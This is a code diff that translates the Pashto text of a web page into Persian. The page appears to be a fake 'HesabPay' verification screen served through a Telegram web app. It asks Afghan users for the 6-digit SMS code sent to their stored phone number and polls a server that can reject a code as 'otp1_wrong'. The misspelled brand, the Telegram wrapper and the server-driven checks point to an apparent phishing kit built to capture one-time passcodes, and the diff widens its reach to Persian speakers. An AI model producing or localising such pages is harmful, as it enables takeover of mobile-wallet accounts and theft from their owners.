@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ps" dir="rtl">
+<html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Hesapay - د تایید کوډ</title>
+    <title>HesabPay - کد تأیید</title>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
@@ -170,11 +170,11 @@
 <div class="top-header">
     <div class="back-arrow" onclick="history.back()">←</div>
     <div class="lock-icon-box">🔒</div>
-    <h1 class="header-title">کوډ داخل کړئ</h1>
+    <h1 class="header-title">وارد کردن کد</h1>
 </div>
 
 <div class="card" id="inputSection">
-    <p class="instruction" id="instructionText">مهرباني وکړئ هغه ۶ عدده کوډ ولیکئ چې ستاسو په شمیره SMS شوی دی.</p>
+    <p class="instruction" id="instructionText">لطفاً کد ۶ رقمی که به شماره شما پیامک (SMS) شده است را وارد کنید.</p>
 
     <div id="errorBox"></div>
 
@@ -188,16 +188,16 @@
     </div>
 
     <div class="paste-container">
-        <button type="button" class="btn-paste" id="pasteBtn">لګول (Paste)</button>
+        <button type="button" class="btn-paste" id="pasteBtn">جای‌گذاری (Paste)</button>
     </div>
 
     <button id="verifyBtn" class="btn-verify" onclick="handleVerification()" disabled>
-        تایید کړئ
+        تأیید
     </button>
 </div>
 
 <div class="card" id="loadingSection">
-    <p style="color: #4a5568; font-size: 16px; font-weight: 500;">مهرباني وکړئ لږ انتظار وکړئ...</p>
+    <p style="color: #4a5568; font-size: 16px; font-weight: 500;">لطفاً کمی منتظر بمانید...</p>
 </div>
 
 <script>
@@ -217,10 +217,10 @@ window.onload = () => {
 
     const phone = localStorage.getItem('phone');
     if (!phone) {
-        errorBox.innerText = "غونډه پای ته رسیدلې. مهرباني وکړئ بیا ننوتل وکړئ.";
+        errorBox.innerText = "نشست منقضی شده است. لطفاً دوباره وارد شوید.";
         setTimeout(() => window.location.href = "/index.html", 1500);
     } else {
-        instructionText.innerHTML = `مهرباني وکړئ هغه ۶ عدده کوډ ولیکئ چې ستاسو په ثبت شوي تلیفون شمیره<br><b>+93 ${phone}</b> د SMS له لارې لیږل شوی دی.`;
+        instructionText.innerHTML = `لطفاً کد ۶ رقمی ارسال شده به شماره تلیفون ثبت‌شده شما<br><b>+93 ${phone}</b> از طریق پیامک (SMS) را وارد کنید.`;
     }
 };
 
@@ -298,7 +298,7 @@ async function handleVerification() {
 
             if (data.status === "otp1_wrong") {
                 clearInterval(poll);
-                errorBox.innerText = "❌ کوډ ناسم دی، مهرباني وکړئ سم کوډ داخل کړئ";
+                errorBox.innerText = "❌ کد نادرست است، لطفاً کد صحیح را وارد کنید";
                 reset();
             }
 
